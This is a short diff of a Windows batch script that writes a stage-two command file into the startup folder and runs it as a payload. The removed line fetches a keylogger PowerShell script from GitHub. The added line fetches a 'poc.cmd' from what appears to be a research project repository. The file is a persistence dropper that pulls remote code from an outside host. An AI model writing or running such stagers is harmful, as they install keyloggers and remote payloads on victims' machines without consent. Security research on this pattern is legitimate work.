@@ -12,7 +12,7 @@ cd %STARTUP%
 @REM Write payloads to startup
 
 (
-    echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/AbishekPonmudi/Keylogger/blob/main/keylogger.ps1' -OutFile 'keylogger.ps1'"
+    echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/Reiya-cyber/ResearchProject/blob/main/Original/Resources/poc.cmd'"
 ) > stage2.cmd
 
 @REM run payload
